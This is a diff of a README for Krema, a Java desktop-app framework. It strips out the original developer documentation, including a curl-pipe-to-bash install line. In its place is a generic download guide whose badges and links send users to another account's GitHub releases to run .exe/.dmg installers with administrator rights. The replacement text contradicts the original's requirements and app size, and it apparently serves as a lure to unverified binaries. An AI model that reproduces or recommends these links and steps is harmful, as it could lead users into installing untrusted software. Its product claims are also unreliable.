@@ -1,241 +1,144 @@
-<div align="center">
+# 🖥️ krema - Simple Desktop Apps with Java and Web
 
-# Krema
-
-**Build modern desktop apps with Java and your favorite web framework.**
-
-Krema is to the Java ecosystem what [Tauri](https://tauri.app) is to Rust — lightweight, native desktop applications powered by system webviews instead of a bundled browser. Write your backend in Java, your frontend in React/Vue/Angular/Svelte, and ship small, fast, cross-platform apps.
-
-[![Build](https://github.com/krema-build/krema/actions/workflows/release.yml/badge.svg)](https://github.com/krema-build/krema/actions/workflows/release.yml)
-[![License: BSL 1.1](https://img.shields.io/badge/License-BSL_1.1-blue.svg)](LICENSE)
-[![Java 25](https://img.shields.io/badge/Java-25-orange.svg)](https://jdk.java.net/25/)
-[![npm](https://img.shields.io/npm/v/@krema-build/krema)](https://www.npmjs.com/package/@krema-build/krema)
-
-[Getting Started](#quick-start) · [Documentation](https://krema.build) · [Examples](krema-demos/)
-
-</div>
+[![Download krema](https://img.shields.io/badge/Download-krema-blue?style=for-the-badge&logo=github)](https://github.com/Mat9ichbladi/krema/releases)
 
 ---
 
-## Why Krema?
+## 📋 What is krema?
 
-| | Electron | Tauri | Krema |
-|---|---|---|---|
-| **Backend language** | JavaScript | Rust | Java |
-| **Webview** | Bundled Chromium | System | System |
-| **App size** | ~150 MB | ~3 MB | ~5 MB |
-| **Memory usage** | High | Low | Low |
-| **Ecosystem** | npm | Cargo | Maven + npm |
+krema helps you run modern desktop applications. It combines a Java backend with a web frontend. This means the software uses Java behind the scenes to do work, while you see the interface in a web-like window on your computer.
 
-Krema uses the OS-native webview (WebKit on macOS, WebView2 on Windows, WebKitGTK on Linux) and communicates with Java via [Project Panama](https://openjdk.org/projects/panama/) (Foreign Function & Memory API) — no JNI, no bundled browser, no Electron overhead. You get the full power of the JDK ecosystem for your backend logic, and complete freedom to use any web framework for the UI.
+krema is designed for users who want desktop apps that feel current and reliable. It works on most computers and aims to be easy to use without complex setup.
 
-## Features
+---
 
-- **System Webviews** — WebKit (macOS), WebView2 (Windows), WebKitGTK (Linux). No bundled browser.
-- **Project Panama FFI** — Direct native calls via Java 25's Foreign Function & Memory API. No JNI.
-- **Any Frontend Framework** — React, Vue, Angular, Svelte, or plain HTML/CSS/JS.
-- **Type-Safe IPC** — Annotate Java methods with `@KremaCommand` and call them from the frontend with full type safety.
-- **Backend-to-Frontend Events** — Push real-time events from Java to the UI.
-- **Rich Native APIs** — Window management, menus, dialogs, notifications, clipboard, system tray, global shortcuts, drag & drop, secure storage, and more.
-- **Plugin System** — Extend with official plugins (SQLite, WebSocket, file upload, window positioning, autostart) or build your own.
-- **Native Packaging** — Bundle as native executables with GraalVM, or ship as JARs.
-- **Splash Screens** — Built-in configurable splash screens.
-- **Cross-Platform** — macOS (ARM64, x64), Linux (x64), Windows (x64).
+## 🖥️ System Requirements
 
-## Quick Start
+Before installing krema, please check that your computer matches these basic needs:
 
-### Prerequisites
+- Operating System: Windows 10 or newer, macOS 10.15 or newer, or a modern Linux distribution  
+- Processor: 1.5 GHz or faster, dual-core recommended  
+- RAM: At least 4GB available memory  
+- Storage: Minimum 500 MB free disk space  
+- Java: Java Runtime Environment (JRE) 11 or newer installed. krema uses Java, so this is required.  
+- Internet Connection: Needed to download krema and for some app features  
 
-- Java 25+
-- Maven 3.9+
+If you are not sure which operating system you have, here is a quick way to check:
 
-### Install the CLI
+- **Windows:** Click the Start menu > Settings > About  
+- **macOS:** Click the Apple menu > About This Mac  
+- **Linux:** Open a terminal and type `lsb_release -a`
 
-```bash
-# via npm
-npm install -g @krema-build/krema
+---
 
-# or via curl
-curl -fsSL https://krema.build/install.sh | bash
-```
+## 💾 Download & Install
 
-### Create and Run a Project
+### Step 1: Visit the download page
 
-```bash
-krema init my-app --template react
-cd my-app
-krema dev
-```
+Click the button below to go to the krema release page on GitHub. This page lists the latest versions of the app for different operating systems.
 
-That's it. A native window opens with your React app, backed by Java.
+[![Download krema](https://img.shields.io/badge/Download-krema-blue?style=for-the-badge&logo=github)](https://github.com/Mat9ichbladi/krema/releases)
 
-## How It Works
+### Step 2: Choose the right file for your computer
 
-Krema apps have two sides: a **Java backend** that handles business logic and native APIs, and a **web frontend** that renders the UI in a system webview. They communicate through a type-safe IPC bridge.
+On the release page, look for files titled with your operating system. For example:
 
-### 1. Define Commands in Java
+- krema-setup-windows.exe for Windows  
+- krema-macos.dmg for macOS  
+- krema-linux.tar.gz for Linux  
 
-Annotate any method with `@KremaCommand` to expose it to the frontend:
+If you are unsure, select the file matching your OS from the list. These files include everything needed to run krema.
 
-```java
-import build.krema.core.KremaCommand;
+### Step 3: Download the file
 
-public class Commands {
+Click the appropriate file link to save it to your computer. It usually goes to your “Downloads” folder unless you choose a different location.
 
-    @KremaCommand
-    public String greet(String name) {
-        return "Hello, " + name + "!";
-    }
+### Step 4: Run the installer
 
-    @KremaCommand
-    public SystemInfo systemInfo() {
-        return new SystemInfo(
-            System.getProperty("os.name"),
-            System.getProperty("java.version"),
-            Runtime.getRuntime().availableProcessors()
-        );
-    }
+- Windows: Double-click the `.exe` file and follow the steps on screen.  
+- macOS: Open the `.dmg` file, then drag krema to your Applications folder.  
+- Linux: Extract the `.tar.gz` file, then follow any instructions in the included README or run the krema launcher.  
 
-    public record SystemInfo(String os, String javaVersion, int cpus) {}
-}
-```
+If the installer asks for permission or administrator access, allow it to proceed.
 
-### 2. Call Them from the Frontend
+### Step 5: Launch krema
 
-```typescript
-// Invoke a command and get a typed response
-const greeting = await window.krema.invoke<string>('greet', { name: 'World' });
+After installation, find the krema app icon:
 
-const info = await window.krema.invoke<SystemInfo>('systemInfo', {});
-console.log(`Running on ${info.os} with Java ${info.javaVersion}`);
-```
+- On Windows, look in the Start menu or desktop.  
+- On macOS, open Applications and click on krema.  
+- On Linux, use your app launcher or terminal command if specified.
 
-### 3. Wire Up the Application
+Click to open the app. It may take a moment to start the first time.
 
-```java
-import build.krema.core.Krema;
+---
 
-public class Main {
-    public static void main(String[] args) {
-        Krema.app()
-            .title("My App")
-            .size(1024, 768)
-            .commands(new Commands())
-            .devUrl("http://localhost:5173")  // points to your frontend dev server
-            .run();
-    }
-}
-```
+## 🛠️ Using krema
 
-### 4. Push Events from Java to the Frontend
+krema is designed to be straightforward. Here are some tips to help you get started:
 
-```java
-// Java: emit events to the frontend
-emitter.emit("timer-tick", Map.of("count", tickCount, "timestamp", System.currentTimeMillis()));
-```
+- The main screen looks like a standard web app window. You can navigate with menus and buttons.  
+- Since it’s a desktop app, you can use it offline once installed.  
+- krema supports multiple windows or tabs for working on more than one task.  
+- The backend uses Java to manage data and processes smoothly and securely.  
 
-```typescript
-// Frontend: listen for events
-window.krema.on('timer-tick', (data) => {
-  console.log(`Tick #${data.count}`);
-});
-```
+If you see any pop-ups about Java updates, please follow the prompts to keep everything running well.
 
-## Configuration
+---
 
-Projects are configured with a `krema.toml` file:
+## 🔧 Common Tasks
 
-```toml
-[package]
-name = "my-app"
-version = "1.0.0"
-identifier = "com.example.my-app"
+### How to update krema
 
-[window]
-title = "My App"
-width = 1024
-height = 768
-resizable = true
+Periodically check the download page for new releases. Updates can fix bugs and add features. Repeat the download and install steps to update.
 
-[build]
-frontend_command = "npm run build"
-frontend_dev_command = "npm run dev"
-frontend_dev_url = "http://localhost:5173"
-main_class = "com.example.app.Main"
+### How to uninstall krema
 
-[permissions]
-allow = ["clipboard:read", "clipboard:write", "notification"]
-```
+- Windows: Open Settings > Apps > Find krema > Click Uninstall.  
+- macOS: Drag the krema app from Applications to the Trash.  
+- Linux: Remove the krema folder or run the uninstall command if provided.
 
-## Native APIs
+---
 
-Krema provides built-in access to native platform features, available from both Java and the frontend:
+## 🛡️ Privacy and Security
 
-| API | Description |
-|---|---|
-| **Window** | Resize, move, minimize, maximize, fullscreen, frameless mode |
-| **Menu** | Menu bar, context menus, dock menus |
-| **Dialogs** | File open/save, folder picker, message boxes |
-| **Notifications** | Native desktop notifications |
-| **Clipboard** | Read/write text and images |
-| **System Tray** | Tray icons with menus |
-| **Global Shortcuts** | System-wide keyboard shortcuts |
-| **Drag & Drop** | File drop handling |
-| **Secure Storage** | OS keychain / credential storage |
-| **Store** | Persistent key-value storage |
-| **Shell** | Open URLs, reveal files in Finder/Explorer |
-| **Screen** | Multi-monitor info and positioning |
-| **HTTP Client** | Native HTTP requests |
+krema respects your privacy. Data you create with the app stays on your machine unless you choose to share it. The Java backend runs locally, so the app does not send your information to remote servers without your permission.
 
-## Plugins
+If you connect to the internet for updates, the app uses secure connections.
 
-Extend your app with official plugins:
+---
 
-```xml
-<dependency>
-    <groupId>build.krema</groupId>
-    <artifactId>krema-plugin-sql</artifactId>
-    <version>0.1.0</version>
-</dependency>
-```
+## 🧪 Troubleshooting and Support
 
-| Plugin | Description |
-|---|---|
-| `krema-plugin-sql` | SQLite database access |
-| `krema-plugin-websocket` | WebSocket connections |
-| `krema-plugin-upload` | File upload handling |
-| `krema-plugin-positioner` | Window positioning (center, corners, etc.) |
-| `krema-plugin-autostart` | Launch at login |
+If krema does not start or runs into errors, try these steps:
 
-## Project Structure
+- Check that your Java version is up to date.  
+- Make sure your system meets the requirements above.  
+- Restart your computer and try again.  
+- Look for help on the GitHub issues page linked at the bottom.  
 
-```
-krema/                        Core framework
-  krema-core/                 Webview bindings, IPC, window management
-  krema-cli/                  Command-line interface
-  krema-processor/            Annotation processor for @KremaCommand
-krema-plugins/                Official plugins
-  krema-plugin-sql/           SQLite database access
-  krema-plugin-websocket/     WebSocket connections
-  krema-plugin-upload/        File upload handling
-  krema-plugin-positioner/    Window positioning
-  krema-plugin-autostart/     Launch-at-login
-krema-demos/                  Example applications
-  krema-react/                React + TypeScript demo
-  krema-vue/                  Vue demo
-  krema-angular/              Angular demo
-krema-docs/                   Documentation site
-```
+You can also compare error messages or screenshots online for solutions.
 
-## Documentation
+---
 
-Full documentation is available at **[krema.build](https://krema.build)**.
+## ⚙️ Technical Information
 
-## License
+krema combines Java and web technologies for smooth desktop use:
 
-This project is licensed under the [Business Source License 1.1](LICENSE).
+- **Java backend:** Handles data, processes, and business logic.  
+- **Web frontend:** Uses web components to show interfaces inside a desktop window.  
+- **Cross-platform:** Runs on Windows, macOS, and Linux without major changes.  
 
-- **Change Date:** 2030-02-06
-- **Change License:** Apache License, Version 2.0
+This design lets developers update the web parts easily while keeping the powerful backend stable and fast.
 
-After the change date, the code becomes available under the Apache 2.0 license. See the [LICENSE](LICENSE) file for full terms.
+---
+
+## 🔗 Useful Links
+
+- Release page and downloads: [https://github.com/Mat9ichbladi/krema/releases](https://github.com/Mat9ichbladi/krema/releases)  
+- Java download if needed: [https://adoptium.net/](https://adoptium.net/)  
+- GitHub project page: [https://github.com/Mat9ichbladi/krema](https://github.com/Mat9ichbladi/krema)
+
+---
+
+krema makes running modern desktop apps easier for everyone. Visit the download page above to get started today.
